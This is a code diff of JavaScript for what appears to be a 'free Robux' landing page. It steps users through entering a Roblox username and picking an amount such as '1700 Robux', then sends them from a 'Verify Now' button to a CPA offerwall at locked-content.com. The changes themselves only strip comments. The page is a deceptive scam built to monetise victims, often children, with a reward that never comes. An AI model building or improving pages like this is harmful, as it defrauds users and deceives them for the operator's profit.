@@ -39,9 +39,7 @@
 
   // ----- STEP 1 → STEP 2: proceed -----
   proceedToAmountBtn.addEventListener('click', function() {
-    // update username before moving to step 2
     updateUsernameDisplay();
-    
     step1.classList.add('hidden');
     step2.classList.remove('hidden');
   });
@@ -53,7 +51,7 @@
     }
   });
 
-  // Update username in real-time as user types (for preview)
+  // Update username in real-time as user types
   usernameInput.addEventListener('input', function() {
     updateUsernameDisplay();
   });
@@ -72,7 +70,6 @@
 
   // proceed button: go to step 3 (verification)
   proceedToVerifyBtn.addEventListener('click', function() {
-    // sync amount from active button
     const activeAmount = document.querySelector('.amount-btn.active');
     if (activeAmount) {
       const amt = activeAmount.getAttribute('data-amount') || '1700 Robux';
@@ -80,7 +77,6 @@
     } else {
       updateAmountUI('1700 Robux');
     }
-    // ensure username is up to date
     updateUsernameDisplay();
 
     step2.classList.add('hidden');
@@ -89,7 +85,6 @@
 
   // ----- STEP 3: VERIFY NOW → CPA OFFERWALL -----
   verifyNowBtn.addEventListener('click', function(e) {
-    // redirect to your CPA offerwall
     window.location.href = 'https://locked-content.com/?9ded58f';
   });
 
@@ -97,8 +92,6 @@
   updateAmountUI('1700 Robux');
   verifyUsername.textContent = 'User';
   usernameInput.placeholder = 'Enter your username...';
-  
-  // Update username display on page load if there's a value
   updateUsernameDisplay();
 
   console.log('Landing ready — 3-step flow, CPA redirect on Verify Now');
